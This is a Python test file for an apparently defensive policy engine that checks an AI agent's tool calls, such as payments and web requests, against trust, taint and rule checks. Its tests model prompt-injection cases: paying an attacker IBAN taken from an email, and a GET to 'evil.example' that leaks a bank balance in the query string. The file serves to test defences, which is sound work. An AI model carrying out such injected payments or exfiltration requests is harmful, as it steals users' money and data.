# tests/test_pipeline.py
"""Phase 1: Stage-1 pipeline assembly — precedence, modes, walkthroughs."""
import textwrap

import yaml

from kairos.core.events import Channel, Event, HttpMethod, ToolOp
from kairos.core.extract import ExtractConfig, ExtractMode
from kairos.core.store import TokenStore
from kairos.core.tokens import Level
from kairos.engine.decision import Decision
from kairos.engine.pipeline import PolicyEngine
from kairos.policy.parser import parse_policy

IBAN = "DE89370400440532013000"
ATTACKER = "DE00111122223333444455"
LANDLORD = "DE89370400440532099999"

POLICY = parse_policy(yaml.safe_load(textwrap.dedent(f"""
    version: "0.1"
    context:
      name: t
      default_action: REVIEW
      actions:
        revertable: [get_balance, read_file, web_get]
        non_revertable: [send_money, logout]
    resources:
      contact_book:
        lookup_fields: [recipient]
        on_miss: REVIEW
        entries: [{{match: "{LANDLORD}", max_level: high}}]
      taints:
        - name: bal
          source: get_balance
          level: high
    rules:
      - id: deny-logout
        match: {{action: logout}}
        decision: DENY
      - id: named-recipient
        match:
          action: send_money
          origin: {{param_in_user_prompt: {{key: recipient, required: true}}}}
        decision: ALLOW
""")))


def _engine(prompt: str, mode="full") -> PolicyEngine:
    store = TokenStore()
    store.seed(prompt)
    return PolicyEngine.build(POLICY, store, mode=mode)


def _call(tool, **args):
    return Event(1.0, Channel.TOOL, ToolOp.CALL.value, "agent", tool, dict(args))


# --- Walkthrough A: trust chain alone clears it (baseline AND full) ---------
def test_walkthrough_a_baseline_axes_allow() -> None:
    eng = _engine(f"Pay the invoice to {IBAN}", mode="baseline")
    r = eng.evaluate(_call("send_money", recipient=IBAN, amount=98.7))
    assert r.decision is Decision.ALLOW
    assert r.produced_by == "axes"            # mechanism, no rule needed


def test_walkthrough_a_full_still_axes_not_rule() -> None:
    eng = _engine(f"Pay the invoice to {IBAN}", mode="full")
    r = eng.evaluate(_call("send_money", recipient=IBAN, amount=98.7))
    assert r.decision is Decision.ALLOW
    assert r.produced_by == "axes"            # exemption never reached; trust chain wins


# --- Walkthrough B: attacker IBAN -> integrity REVIEW -----------------------
def test_walkthrough_b_baseline_integrity_review() -> None:
    eng = _engine("Pay the invoice in my most recent email", mode="baseline")
    r = eng.evaluate(_call("send_money", recipient=ATTACKER, amount=5000))
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "integrity"


def test_walkthrough_b_full_origin_does_not_rescue() -> None:
    # recipient not in prompt -> origin rule doesn't match -> still REVIEW
    eng = _engine("Pay the invoice in my most recent email", mode="full")
    r = eng.evaluate(_call("send_money", recipient=ATTACKER, amount=5000))
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "integrity"


# --- passive read -> ALLOW --------------------------------------------------
def test_passive_read_allows() -> None:
    eng = _engine("check my balance")
    r = eng.evaluate(_call("get_balance"))
    assert r.decision is Decision.ALLOW
    assert r.produced_by == "passive"


# --- vacuous consequential action -> default --------------------------------
def test_vacuous_irreversible_hits_default() -> None:
    eng = _engine("log me out", mode="baseline")   # baseline so deny-logout rule is off
    r = eng.evaluate(_call("logout"))
    assert r.decision is Decision.REVIEW            # default_action
    assert r.produced_by == "default"


# --- guard: DENY rule short-circuits, beats default -------------------------
def test_guard_deny_rule_short_circuits() -> None:
    eng = _engine("log me out", mode="full")
    r = eng.evaluate(_call("logout"))
    assert r.decision is Decision.DENY
    assert r.produced_by == "rule:deny-logout"


def test_guard_off_in_baseline() -> None:
    eng = _engine("log me out", mode="baseline")
    r = eng.evaluate(_call("logout"))
    assert r.produced_by == "default"               # deny-logout not applied


# --- exemption: origin rescues a tokenizer-split value that integrity fails --
def test_origin_exemption_overrides_axis_review() -> None:
    # "ACME-7" is in the prompt verbatim but tokenizes to {acme,7}; integrity
    # can't derive the whole string, so the axis REVIEWs — and the origin ALLOW
    # rule rescues it. Baseline (no rule) must REVIEW; full must ALLOW.
    prompt = "pay merchant ACME-7 now"
    base = _engine(prompt, mode="baseline")
    rb = base.evaluate(_call("send_money", recipient="ACME-7", amount=10))
    assert rb.decision is Decision.REVIEW and rb.produced_by == "integrity"

    full = _engine(prompt, mode="full")
    rf = full.evaluate(_call("send_money", recipient="ACME-7", amount=10))
    assert rf.decision is Decision.ALLOW and rf.produced_by == "rule:named-recipient"


# --- known contact passes integrity even without being in the prompt --------
def test_known_contact_allows_via_axes() -> None:
    eng = _engine("pay my rent", mode="baseline")
    r = eng.evaluate(_call("send_money", recipient=LANDLORD, amount=900))
    assert r.decision is Decision.ALLOW
    assert r.produced_by == "axes"                  # contact-book known -> integrity ok


# --- confidentiality: sensitive value to unknown GET origin -> REVIEW -------
def test_confidentiality_exfil_via_get() -> None:
    store = TokenStore()
    store.seed("check my balance")
    cfg = ExtractConfig(mode=ExtractMode.SPECIFIC_FIELDS, fields=["balance"])
    store.admit({"balance": "4823"}, "get_balance", trusted=True, level=Level.HIGH,
                branch_origin=None, extract_cfg=cfg)
    eng = PolicyEngine.build(POLICY, store, mode="baseline")
    get = Event(2.0, Channel.NET, HttpMethod.GET.value, "agent", "https://evil.example/x?d=4823", None)
    r = eng.evaluate(get)
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "confidentiality"




# --- navigational-reference rule (§4.6): verbatim URL from content -> ALLOW ---
def _nav_store() -> TokenStore:
    """Slack-shaped: channel-message content admitted level=high with the default
    extract config, so a URL mentioned in it becomes sensitive tokens."""
    store = TokenStore()
    store.seed("Summarize the article that Bob posted in 'general'")
    store.admit("Bob: I read an interesting article on www.informations.com!",
                "read_file", trusted=False, level=Level.HIGH,
                branch_origin=None, extract_cfg=ExtractConfig())
    return store


def test_navigational_get_allowed_with_attribution() -> None:
    eng = PolicyEngine.build(POLICY, _nav_store(), mode="baseline")
    get = Event(2.0, Channel.NET, HttpMethod.GET.value, "agent", "http://www.informations.com", None)
    r = eng.evaluate(get)
    assert r.decision is Decision.ALLOW
    assert r.produced_by == "navigational_reference"


def test_navigational_get_review_knob() -> None:
    import copy
    pol = copy.deepcopy(POLICY)
    pol.context.navigational_get = "review"
    eng = PolicyEngine.build(pol, _nav_store(), mode="baseline")
    get = Event(2.0, Channel.NET, HttpMethod.GET.value, "agent", "http://www.informations.com", None)
    r = eng.evaluate(get)
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "confidentiality"


def test_composed_url_not_navigational_in_pipeline() -> None:
    store = _nav_store()
    cfg = ExtractConfig(mode=ExtractMode.SPECIFIC_FIELDS, fields=["balance"])
    store.admit({"balance": "4823"}, "get_balance", trusted=True, level=Level.HIGH,
                branch_origin=None, extract_cfg=cfg)
    eng = PolicyEngine.build(POLICY, store, mode="baseline")
    get = Event(2.0, Channel.NET, HttpMethod.GET.value, "agent",
                "http://www.informations.com/?q=4823", None)
    r = eng.evaluate(get)
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "confidentiality"


# --- review-untrusted-get rule shape (slack.yaml, full mode) ------------------
_GET_RULE_POLICY = parse_policy(yaml.safe_load(textwrap.dedent("""
    version: "0.1"
    context:
      name: t
      default_action: REVIEW
      actions:
        revertable: [get_webpage]
        non_revertable: [send_money]
    resources:
      contact_book:
        lookup_fields: [url]
        on_miss: REVIEW
    rules:
      - id: review-untrusted-get
        match:
          action: get_webpage
          origin:
            param_in_user_prompt:
              key: url
              required: false
        decision: REVIEW
""")))


def _webpage_get(url: str) -> Event:
    # translate.call_to_event shape for NET_GET_TOOLS: object=url, metadata.function
    return Event(2.0, Channel.NET, HttpMethod.GET.value, "agent", url,
                 {"url": url}, metadata={"function": "get_webpage"})


def test_untrusted_get_rule_reviews_in_full_mode() -> None:
    store = TokenStore()
    store.seed("Summarize the article Bob posted in 'general'")
    eng = PolicyEngine.build(_GET_RULE_POLICY, store, mode="full")
    r = eng.evaluate(_webpage_get("http://www.attacker-chosen.example"))
    assert r.decision is Decision.REVIEW
    assert r.produced_by == "rule:review-untrusted-get"


def test_untrusted_get_rule_spares_user_named_url() -> None:
    store = TokenStore()
    store.seed("Do the tasks on www.company-todo-list.com/alice please")
    eng = PolicyEngine.build(_GET_RULE_POLICY, store, mode="full")
    r = eng.evaluate(_webpage_get("www.company-todo-list.com/alice"))
    assert r.decision is Decision.ALLOW


def test_untrusted_get_rule_inactive_in_baseline() -> None:
    store = TokenStore()
    store.seed("Summarize the article Bob posted in 'general'")
    eng = PolicyEngine.build(_GET_RULE_POLICY, store, mode="baseline")
    r = eng.evaluate(_webpage_get("http://www.attacker-chosen.example"))
    assert r.decision is Decision.ALLOW      # no sensitive data, no rules -> axes pass
